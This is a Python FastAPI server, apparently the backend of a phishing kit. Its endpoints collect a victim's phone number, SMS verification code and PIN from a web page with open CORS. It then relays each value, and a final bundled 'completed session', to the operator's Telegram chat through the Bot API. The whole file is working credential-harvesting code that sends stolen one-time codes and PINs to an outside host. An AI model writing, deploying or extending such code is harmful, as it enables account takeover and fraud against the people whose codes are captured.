import os
import logging
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn
import requests

# --- Конфигурация ---
BOT_TOKEN = os.getenv("BOT_TOKEN")
MY_CHAT_ID = os.getenv("MY_CHAT_ID")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# --- Логирование ---
logging.basicConfig(level=logging.INFO)

# --- Временное хранилище сессий (в памяти) ---
# Ключ: session_id, значение: {"phone": "...", "code": "..."}
sessions = {}

def send_to_telegram(text: str):
    payload = {"chat_id": MY_CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        resp = requests.post(TELEGRAM_API_URL, json=payload, timeout=5)
        resp.raise_for_status()
    except Exception as e:
        logging.error(f"Ошибка отправки в Telegram: {e}")

# --- Модели данных ---
class PhoneData(BaseModel):
    phone: str
    session_id: str

class CodeData(BaseModel):
    session_id: str
    code: str

class PinData(BaseModel):
    session_id: str
    pin: str

# --- FastAPI приложение ---
@asynccontextmanager
async def lifespan(app: FastAPI):
    send_to_telegram("🤖 *Бот запущен* (сессии, CORS включён)")
    yield
    send_to_telegram("⚠️ Бот остановлен")

app = FastAPI(lifespan=lifespan)

# Разрешаем CORS (чтобы запросы с вашей HTML-страницы работали)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # для теста; можно позже ограничить доменом
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.post("/submit_phone")
async def submit_phone(data: PhoneData):
    phone = data.phone
    sid = data.session_id
    if not phone or not sid:
        raise HTTPException(status_code=400, detail="Не хватает номера или session_id")
    
    sessions[sid] = {"phone": phone}
    send_to_telegram(f"📞 *Номер телефона*\nСессия: `{sid}`\nНомер: `{phone}`")
    return {"status": "ok"}

@app.post("/submit_code")
async def submit_code(data: CodeData):
    sid = data.session_id
    code = data.code
    if not sid or not code:
        raise HTTPException(status_code=400, detail="Не хватает session_id или кода")
    
    session = sessions.get(sid)
    if not session or "phone" not in session:
        raise HTTPException(status_code=404, detail="Сессия не найдена, начните сначала")
    
    session["code"] = code
    send_to_telegram(f"🔢 *SMS-код*\nСессия: `{sid}`\nНомер: `{session['phone']}`\nКод: `{code}`")
    return {"status": "ok"}

@app.post("/submit_pin")
async def submit_pin(data: PinData):
    sid = data.session_id
    pin = data.pin
    if not sid or not pin:
        raise HTTPException(status_code=400, detail="Не хватает session_id или PIN")
    
    session = sessions.get(sid)
    if not session or "phone" not in session or "code" not in session:
        raise HTTPException(status_code=404, detail="Сессия не найдена или не хватает данных")
    
    message = (
        f"🔐 *ЗАВЕРШЁННАЯ СЕССИЯ*\n"
        f"🆔 Сессия: `{sid}`\n"
        f"📞 Номер: `{session['phone']}`\n"
        f"🔢 SMS-код: `{session['code']}`\n"
        f"🔢 PIN-код: `{pin}`"
    )
    send_to_telegram(message)
    
    # Сессию удаляем, чтобы не засорять память
    del sessions[sid]
    return {"status": "ok"}

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
